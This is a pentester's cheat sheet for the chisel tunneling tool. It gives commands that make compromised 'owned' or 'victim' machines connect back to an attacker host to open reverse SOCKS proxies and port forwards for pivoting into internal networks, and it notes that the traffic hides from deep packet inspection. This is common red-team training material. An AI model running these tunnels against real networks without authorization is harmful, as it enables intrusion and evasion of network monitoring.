# Chisel
if you get:


> /chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32` not found (required by ./chisel)
go [here](https://github.com/jpillora/chisel/releases) for the appropriate release.

Chisel makes it possible to do HTTP tunneling encrypted such that deep packet inspection won't be able to look into the details of the traffic.

Note that you can state multiple forwarding statements in a single `chisel client ...` command.

Also keep in mind that chisel can be run in a non-blocking manner in powershell by doing:

```
Start-Process -NoNewWindow ./chisel -Args "client ..."
```


## Dynamic Port Forwarding


We run a chisel server on `${ATTACKER_IP}` which allows us to connect back from an owned machine:

```
chisel server --port ${ATTACKER_PORT} --reverse
```

From the `${OWNED_IP0}`, run 

```
chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks
```
This creates a SOCKS tunnel (bound to 1080 by default). <--- USE 1080 as proxy port, not `${ATTACKER_PORT}`. Also when setting up the proxy in the browser!

If you want it to not block your current shell, do:

```
chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks > /dev/null 2>&1 &
```

If you don't want to use port 1080, do:

```
chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:${SOME_PORT}:socks
```

now, use `${SOME_PORT}` as the socks proxy port.


Once the client and server is setup, we can access targets from the point of view of `${OWNED_IP0}` by using proxychains4:

Add to proxychains4.conf:
```
socks5 127.0.0.1 1080
```

```
proxychains4 -f proxychains4.conf ${SOME_COMMAND} 
```


## Local Port Forwarding

Start the server without the `--reverse` arg on your kali machine:

```
chisel server -p ${ATTACKER_CHISEL_PORT} 
```


on the victim (e.g. a machine that bridges the gap between a WAN and a DMZ network):

```
chisel client ${ATTACKER_IP}:${ATTACKER_CHISEL_PORT} ${VICTIM_LISTENING_PORT}:${TARGET_IP}:${TARGET_PORT}
```

For instance, if you want to expose ports 80 and 443 from your attack box to the internal network,
from the bridging machine, run:

```
./chisel client ${ATTACKER_IP}:${ATTACKER_CHISEL_PORT} 8380:${ATTACKER_IP}:80 4443:${ATTACKER_IP}:443
```

Now, from the internal network, you can hit port 8380 on the bridging victim (remember to use the internal IP),
to hit port 80 on the attack box, and port 4443 to hit port 443 on the attack box.


## Remote Port Forwarding 

if you want to expose a single port on an owned machine `IP0`, you can do:


```
./chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:${ATTACKER_PORT1}:${OWNED_IP}:${OWNED_PORT}
```

This allows traffic to go between `$ATTACKER_PORT1` and `${OWNED_IP}:${OWNED_PORT}`.
For exposing a local port on a machine do:

```
./chisel client ${ATTACKER_IP}:3333 R:9000:127.0.0.1:8000
```
Now, you can access the website internally exposed on `127.0.0.1:8000` on the target machine by going to `localhost:9000` in firefox.

Note that you can do multiple port forwarding statements with one client call.
In case you need to forward multiple ports.
